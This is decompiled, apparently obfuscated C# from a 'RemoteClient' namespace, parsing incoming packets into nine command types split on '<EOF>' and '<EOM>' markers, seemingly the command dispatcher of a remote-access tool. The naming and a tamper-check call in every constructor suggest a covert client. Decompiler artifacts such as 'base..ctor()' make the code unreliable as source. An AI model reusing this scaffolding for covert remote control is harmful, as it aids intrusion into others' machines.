using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteClient.Mappers;
using RemoteClient.Polices;
using sdfsdf.Dictionaries;

namespace RemoteClient.Consumers
{
	// Token: 0x0200002F RID: 47
	internal class Method
	{
		// Token: 0x060000D0 RID: 208 RVA: 0x00005E7C File Offset: 0x0000407C
		public static Method.Client DestroyMapper(object setup)
		{
			try
			{
				List<byte[]> list = new List<byte[]>
				{
					setup
				};
				byte b = list[0].ToList<byte>().GetRange(0, 1)[0];
				Method.Client result = null;
				List<byte> list2 = list[0].ToList<byte>();
				list2.RemoveRange(0, 6);
				list[0] = list2.ToArray();
				list = SchemaMapper.CancelContext(SchemaMapper.CancelContext(list[0], Method.m_Expression)[0], Method.m_Message);
				switch (b)
				{
				case 1:
					result = new Method.VisitorSpecificationQueue(1, list[0][0]);
					break;
				case 2:
					result = new Method.Consumer();
					break;
				case 3:
					result = new Method.ModelInterpreterModel(list[0][0], list[1][0], list[2], list[3], list[4][0]);
					break;
				case 4:
					result = new Method.DispatcherParserResolver(list[0][0], list[1][0]);
					break;
				case 5:
					result = new Method.TestSpecificationQueue(list[0][0]);
					break;
				case 6:
					result = new Method.SpecificationMapper();
					break;
				case 7:
					result = new Method.PolicyAlgoListener();
					break;
				case 8:
					result = new Method.IteratorAlgoListener();
					break;
				case 9:
					result = new Method.ObserverAlgoListener(Encoding.ASCII.GetString(list[0]));
					break;
				}
				return result;
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x00002297 File Offset: 0x00000497
		public Method()
		{
			InvocationProcessPolicy.CompareError();
			base..ctor();
		}

		// Token: 0x060000D2 RID: 210 RVA: 0x00002626 File Offset: 0x00000826
		// Note: this type is marked as 'beforefieldinit'.
		static Method()
		{
			InvocationProcessPolicy.CompareError();
			Method.m_Message = Encoding.ASCII.GetBytes("<EOM>");
			Method.m_Expression = Encoding.ASCII.GetBytes("<EOF>");
		}

		// Token: 0x04000095 RID: 149
		private static byte[] m_Message;

		// Token: 0x04000096 RID: 150
		private static byte[] m_Expression;

		// Token: 0x02000030 RID: 48
		public interface Client
		{
			// Token: 0x060000D3 RID: 211
			byte CompareGetter();
		}

		// Token: 0x02000031 RID: 49
		public class VisitorSpecificationQueue : Method.Client
		{
			// Token: 0x060000D4 RID: 212 RVA: 0x00002655 File Offset: 0x00000855
			public VisitorSpecificationQueue(byte value_max, byte colmax)
			{
				InvocationProcessPolicy.CompareError();
				base..ctor();
				this.m_Schema = value_max;
				this.m_Utils = colmax;
			}

			// Token: 0x060000D5 RID: 213 RVA: 0x00006004 File Offset: 0x00004204
			public byte CompareGetter()
			{
				return this.m_Schema;
			}

			// Token: 0x04000097 RID: 151
			public byte m_Schema;

			// Token: 0x04000098 RID: 152
			public byte m_Utils;
		}

		// Token: 0x02000032 RID: 50
		public class Consumer : Method.Client
		{
			// Token: 0x060000D6 RID: 214 RVA: 0x0000601C File Offset: 0x0000421C
			public byte CompareGetter()
			{
				return this._Helper;
			}

			// Token: 0x060000D7 RID: 215 RVA: 0x00002670 File Offset: 0x00000870
			public Consumer()
			{
				InvocationProcessPolicy.CompareError();
				this._Helper = 2;
				base..ctor();
			}

			// Token: 0x04000099 RID: 153
			public byte _Helper;
		}

		// Token: 0x02000033 RID: 51
		public class ModelInterpreterModel : Method.Client
		{
			// Token: 0x060000D8 RID: 216 RVA: 0x00006034 File Offset: 0x00004234
			public ModelInterpreterModel(byte param_count, byte position_second, byte[] comp, byte[] first2, byte t3_Low)
			{
				InvocationProcessPolicy.CompareError();
				this.m_Proc = 3;
				base..ctor();
				this.contextMapper = (Parser.mdToken)param_count;
				this.m_MapperMapper = (position_second == 1);
				this.m_GetterMapper = BitConverter.ToInt32(comp, 0);
				this.m_PropertyMapper = BitConverter.ToInt32(first2, 0);
				this.productMapper = (int)t3_Low;
			}

			// Token: 0x060000D9 RID: 217 RVA: 0x00006088 File Offset: 0x00004288
			public byte CompareGetter()
			{
				return this.m_Proc;
			}

			// Token: 0x0400009A RID: 154
			public byte m_Proc;

			// Token: 0x0400009B RID: 155
			public Parser.mdToken contextMapper;

			// Token: 0x0400009C RID: 156
			public bool m_MapperMapper;

			// Token: 0x0400009D RID: 157
			public int m_GetterMapper;

			// Token: 0x0400009E RID: 158
			public int m_PropertyMapper;

			// Token: 0x0400009F RID: 159
			public int productMapper;
		}

		// Token: 0x02000034 RID: 52
		public class DispatcherParserResolver : Method.Client
		{
			// Token: 0x060000DA RID: 218 RVA: 0x00002684 File Offset: 0x00000884
			public DispatcherParserResolver()
			{
				InvocationProcessPolicy.CompareError();
				this._PrototypeMapper = 4;
				base..ctor();
			}

			// Token: 0x060000DB RID: 219 RVA: 0x00002698 File Offset: 0x00000898
			public DispatcherParserResolver(byte var1, byte no_cust)
			{
				InvocationProcessPolicy.CompareError();
				this._PrototypeMapper = 4;
				base..ctor();
				this.m_TestsMapper = var1;
				this.m_ListenerMapper = (no_cust == 1);
			}

			// Token: 0x060000DC RID: 220 RVA: 0x000060A0 File Offset: 0x000042A0
			public byte CompareGetter()
			{
				return this._PrototypeMapper;
			}

			// Token: 0x040000A0 RID: 160
			public byte _PrototypeMapper;

			// Token: 0x040000A1 RID: 161
			public byte m_TestsMapper;

			// Token: 0x040000A2 RID: 162
			public bool m_ListenerMapper;
		}

		// Token: 0x02000035 RID: 53
		public class TestSpecificationQueue : Method.Client
		{
			// Token: 0x060000DD RID: 221 RVA: 0x000026BD File Offset: 0x000008BD
			public TestSpecificationQueue(byte asset)
			{
				InvocationProcessPolicy.CompareError();
				this.processMapper = 5;
				base..ctor();
				this._PredicateMapper = asset;
			}

			// Token: 0x060000DE RID: 222 RVA: 0x000060B8 File Offset: 0x000042B8
			public byte CompareGetter()
			{
				return this.processMapper;
			}

			// Token: 0x040000A3 RID: 163
			public byte processMapper;

			// Token: 0x040000A4 RID: 164
			public byte _PredicateMapper;
		}

		// Token: 0x02000036 RID: 54
		public class SpecificationMapper : Method.Client
		{
			// Token: 0x060000DF RID: 223 RVA: 0x000060D0 File Offset: 0x000042D0
			public byte CompareGetter()
			{
				return this.objectMapper;
			}

			// Token: 0x060000E0 RID: 224 RVA: 0x000026D8 File Offset: 0x000008D8
			public SpecificationMapper()
			{
				InvocationProcessPolicy.CompareError();
				this.objectMapper = 6;
				base..ctor();
			}

			// Token: 0x040000A5 RID: 165
			public byte objectMapper;
		}

		// Token: 0x02000037 RID: 55
		public class PolicyAlgoListener : Method.Client
		{
			// Token: 0x060000E1 RID: 225 RVA: 0x000060E8 File Offset: 0x000042E8
			public byte CompareGetter()
			{
				return this.m_ReponseMapper;
			}

			// Token: 0x060000E2 RID: 226 RVA: 0x000026EC File Offset: 0x000008EC
			public PolicyAlgoListener()
			{
				InvocationProcessPolicy.CompareError();
				this.m_ReponseMapper = 7;
				base..ctor();
			}

			// Token: 0x040000A6 RID: 166
			public byte m_ReponseMapper;
		}

		// Token: 0x02000038 RID: 56
		public class IteratorAlgoListener : Method.Client
		{
			// Token: 0x060000E3 RID: 227 RVA: 0x00006100 File Offset: 0x00004300
			public byte CompareGetter()
			{
				return this.m_RuleMapper;
			}

			// Token: 0x060000E4 RID: 228 RVA: 0x00002700 File Offset: 0x00000900
			public IteratorAlgoListener()
			{
				InvocationProcessPolicy.CompareError();
				this.m_RuleMapper = 8;
				base..ctor();
			}

			// Token: 0x040000A7 RID: 167
			public byte m_RuleMapper;
		}

		// Token: 0x02000039 RID: 57
		public class ObserverAlgoListener : Method.Client
		{
			// Token: 0x060000E5 RID: 229 RVA: 0x00002714 File Offset: 0x00000914
			public ObserverAlgoListener(string config)
			{
				InvocationProcessPolicy.CompareError();
				this._InterpreterMapper = 9;
				base..ctor();
				this.m_ParserMapper = config;
			}

			// Token: 0x060000E6 RID: 230 RVA: 0x00006118 File Offset: 0x00004318
			public byte CompareGetter()
			{
				return this._InterpreterMapper;
			}

			// Token: 0x040000A8 RID: 168
			public byte _InterpreterMapper;

			// Token: 0x040000A9 RID: 169
			public string m_ParserMapper;
		}
	}
}
